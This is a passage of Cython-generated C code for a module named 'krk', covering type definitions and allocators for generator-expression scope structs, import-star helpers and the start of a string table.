  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct_3_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct_3_genexpr[--__pyx_freecount_3krk___pyx_scope_struct_3_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct_3_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct_3_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct_3_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct_3_genexpr[__pyx_freecount_3krk___pyx_scope_struct_3_genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct_3_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct_3_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct_3_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct_3_genexpr_spec = {
  "krk.__pyx_scope_struct_3_genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct_3_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct_3_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct_3_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_3_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct_3_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct_3_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *__pyx_freelist_3krk___pyx_scope_struct_4_genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct_4_genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_4_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct_4_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct_4_genexpr[--__pyx_freecount_3krk___pyx_scope_struct_4_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct_4_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct_4_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct_4_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct_4_genexpr[__pyx_freecount_3krk___pyx_scope_struct_4_genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct_4_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct_4_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct_4_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct_4_genexpr_spec = {
  "krk.__pyx_scope_struct_4_genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct_4_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct_4_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct_4_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_4_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct_4_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct_4_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *__pyx_freelist_3krk___pyx_scope_struct_5_genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct_5_genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_5_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct_5_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct_5_genexpr[--__pyx_freecount_3krk___pyx_scope_struct_5_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct_5_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct_5_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct_5_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct_5_genexpr[__pyx_freecount_3krk___pyx_scope_struct_5_genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct_5_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct_5_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct_5_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct_5_genexpr_spec = {
  "krk.__pyx_scope_struct_5_genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct_5_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct_5_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct_5_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_5_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct_5_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct_5_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *__pyx_freelist_3krk___pyx_scope_struct_6_genexpr[8];
static int __pyx_freecount_3krk___pyx_scope_struct_6_genexpr = 0;

static PyObject *__pyx_tp_new_3krk___pyx_scope_struct_6_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  #if CYTHON_COMPILING_IN_LIMITED_API
  allocfunc alloc_func = (allocfunc)PyType_GetSlot(t, Py_tp_alloc);
  o = alloc_func(t, 0);
  #else
  if (CYTHON_COMPILING_IN_CPYTHON && likely((int)(__pyx_freecount_3krk___pyx_scope_struct_6_genexpr > 0) & (int)(t->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr)))) {
    o = (PyObject*)__pyx_freelist_3krk___pyx_scope_struct_6_genexpr[--__pyx_freecount_3krk___pyx_scope_struct_6_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr));
    (void) PyObject_INIT(o, t);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  #endif
  return o;
}

static void __pyx_tp_dealloc_3krk___pyx_scope_struct_6_genexpr(PyObject *o) {
  #if CYTHON_USE_TP_FINALIZE
  if (unlikely((PY_VERSION_HEX >= 0x03080000 || __Pyx_PyType_HasFeature(Py_TYPE(o), Py_TPFLAGS_HAVE_FINALIZE)) && __Pyx_PyObject_GetSlot(o, tp_finalize, destructor)) && (!PyType_IS_GC(Py_TYPE(o)) || !__Pyx_PyObject_GC_IsFinalized(o))) {
    if (__Pyx_PyObject_GetSlot(o, tp_dealloc, destructor) == __pyx_tp_dealloc_3krk___pyx_scope_struct_6_genexpr) {
      if (PyObject_CallFinalizerFromDealloc(o)) return;
    }
  }
  #endif
  if (CYTHON_COMPILING_IN_CPYTHON && ((int)(__pyx_freecount_3krk___pyx_scope_struct_6_genexpr < 8) & (int)(Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr)))) {
    __pyx_freelist_3krk___pyx_scope_struct_6_genexpr[__pyx_freecount_3krk___pyx_scope_struct_6_genexpr++] = ((struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}
#if CYTHON_USE_TYPE_SPECS
static PyType_Slot __pyx_type_3krk___pyx_scope_struct_6_genexpr_slots[] = {
  {Py_tp_dealloc, (void *)__pyx_tp_dealloc_3krk___pyx_scope_struct_6_genexpr},
  {Py_tp_new, (void *)__pyx_tp_new_3krk___pyx_scope_struct_6_genexpr},
  {0, 0},
};
static PyType_Spec __pyx_type_3krk___pyx_scope_struct_6_genexpr_spec = {
  "krk.__pyx_scope_struct_6_genexpr",
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr),
  0,
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE,
  __pyx_type_3krk___pyx_scope_struct_6_genexpr_slots,
};
#else

static PyTypeObject __pyx_type_3krk___pyx_scope_struct_6_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "krk.""__pyx_scope_struct_6_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_3krk___pyx_scope_struct_6_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_3krk___pyx_scope_struct_6_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_FINALIZE, /*tp_flags*/
  0, /*tp_doc*/
  0, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  #if !CYTHON_USE_TYPE_SPECS
  0, /*tp_dictoffset*/
  #endif
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_3krk___pyx_scope_struct_6_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  #if CYTHON_USE_TP_FINALIZE
  0, /*tp_finalize*/
  #else
  NULL, /*tp_finalize*/
  #endif
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if __PYX_NEED_TP_PRINT_SLOT == 1
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030C0000
  0, /*tp_watched*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000 && PY_VERSION_HEX < 0x030a0000
  0, /*tp_pypy_flags*/
  #endif
};
#endif

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

static int __pyx_import_star_set(PyObject *o, PyObject* py_name, char *name) {
  static const char* internal_type_names[] = {
    "__pyx_ctuple_Py_ssize_t",
    "__pyx_ctuple_Py_ssize_t_struct",
    "__pyx_ctuple_double__and_double",
    "__pyx_ctuple_double__and_double_struct",
    "__pyx_ctuple_long",
    "__pyx_ctuple_long__and_long",
    "__pyx_ctuple_long__and_long_struct",
    "__pyx_ctuple_long_struct",
    "__pyx_scope_struct_1_genexpr",
    "__pyx_scope_struct_2_genexpr",
    "__pyx_scope_struct_3_genexpr",
    "__pyx_scope_struct_4_genexpr",
    "__pyx_scope_struct_5_genexpr",
    "__pyx_scope_struct_6_genexpr",
    "__pyx_scope_struct__genexpr",
    0
  };
  const char** type_name = internal_type_names;
  while (*type_name) {
    if (__Pyx_StrEq(name, *type_name)) {
      PyErr_Format(PyExc_TypeError, "Cannot overwrite C type %s", name);
      goto bad;
    }
    type_name++;
  }
  if (0);
  else {
    if (PyObject_SetAttr(__pyx_m, py_name, o) < 0) goto bad;
  }
  return 0;
  bad:
  return -1;
}

static int
__Pyx_import_all_from(PyObject *locals, PyObject *v)
{
    PyObject *all = PyObject_GetAttrString(v, "__all__");
    PyObject *dict, *name, *value;
    int skip_leading_underscores = 0;
    int pos, err;
    if (all == NULL) {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError))
            return -1;
        PyErr_Clear();
        dict = PyObject_GetAttrString(v, "__dict__");
        if (dict == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_AttributeError))
                return -1;
            PyErr_SetString(PyExc_ImportError,
            "from-import-* object has no __dict__ and no __all__");
            return -1;
        }
#if PY_MAJOR_VERSION < 3
        all = PyObject_CallMethod(dict, (char *)"keys", NULL);
#else
        all = PyMapping_Keys(dict);
#endif
        Py_DECREF(dict);
        if (all == NULL)
            return -1;
        skip_leading_underscores = 1;
    }
    for (pos = 0, err = 0; ; pos++) {
        name = PySequence_GetItem(all, pos);
        if (name == NULL) {
            if (!PyErr_ExceptionMatches(PyExc_IndexError))
                err = -1;
            else
                PyErr_Clear();
            break;
        }
        if (skip_leading_underscores &&
#if PY_MAJOR_VERSION < 3
            likely(PyString_Check(name)) &&
            PyString_AS_STRING(name)[0] == '_')
#else
            likely(PyUnicode_Check(name)) &&
            likely(__Pyx_PyUnicode_GET_LENGTH(name)) &&
            __Pyx_PyUnicode_READ_CHAR(name, 0) == '_')
#endif
        {
            Py_DECREF(name);
            continue;
        }
        value = PyObject_GetAttr(v, name);
        if (value == NULL)
            err = -1;
        else if (PyDict_CheckExact(locals))
            err = PyDict_SetItem(locals, name, value);
        else
            err = PyObject_SetItem(locals, name, value);
        Py_DECREF(name);
        Py_XDECREF(value);
        if (err != 0)
            break;
    }
    Py_DECREF(all);
    return err;
}
static int __pyx_import_star(PyObject* m) {
    int i;
    int ret = -1;
    char* s;
    PyObject *locals = 0;
    PyObject *list = 0;
#if PY_MAJOR_VERSION >= 3
    PyObject *utf8_name = 0;
#endif
    PyObject *name;
    PyObject *item;
    locals = PyDict_New();              if (!locals) goto bad;
    if (__Pyx_import_all_from(locals, m) < 0) goto bad;
    list = PyDict_Items(locals);        if (!list) goto bad;
    for(i=0; i<PyList_GET_SIZE(list); i++) {
        name = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 0);
        item = PyTuple_GET_ITEM(PyList_GET_ITEM(list, i), 1);
#if PY_MAJOR_VERSION >= 3
        utf8_name = PyUnicode_AsUTF8String(name);
        if (!utf8_name) goto bad;
        s = PyBytes_AS_STRING(utf8_name);
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
        Py_DECREF(utf8_name); utf8_name = 0;
#else
        s = PyString_AsString(name);
        if (!s) goto bad;
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
#endif
    }
    ret = 0;
bad:
    Py_XDECREF(locals);
    Py_XDECREF(list);
#if PY_MAJOR_VERSION >= 3
    Py_XDECREF(utf8_name);
#endif
    return ret;
}


#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif
/* #### Code section: pystring_table ### */

static int __Pyx_CreateStringTabAndInitStrings(void) {
  __Pyx_StringTabEntry __pyx_string_tab[] = {
    {&__pyx_kp_s_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 0, 1, 0},
    {&__pyx_kp_s_00, __pyx_k_00, sizeof(__pyx_k_00), 0, 0, 1, 0},
    {&__pyx_kp_s_01, __pyx_k_01, sizeof(__pyx_k_01), 0, 0, 1, 0},
    {&__pyx_kp_s_02, __pyx_k_02, sizeof(__pyx_k_02), 0, 0, 1, 0},
    {&__pyx_kp_s_03, __pyx_k_03, sizeof(__pyx_k_03), 0, 0, 1, 0},
    {&__pyx_kp_s_04, __pyx_k_04, sizeof(__pyx_k_04), 0, 0, 1, 0},
    {&__pyx_kp_s_05, __pyx_k_05, sizeof(__pyx_k_05), 0, 0, 1, 0},
    {&__pyx_kp_s_06, __pyx_k_06, sizeof(__pyx_k_06), 0, 0, 1, 0},
    {&__pyx_kp_s_08, __pyx_k_08, sizeof(__pyx_k_08), 0, 0, 1, 0},
    {&__pyx_kp_u_0_0, __pyx_k_0_0, sizeof(__pyx_k_0_0), 0, 1, 0, 0},
    {&__pyx_kp_s_0_1, __pyx_k_0_1, sizeof(__pyx_k_0_1), 0, 0, 1, 0},
    {&__pyx_kp_s_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 0, 1, 0},
    {&__pyx_kp_s_10, __pyx_k_10, sizeof(__pyx_k_10), 0, 0, 1, 0},
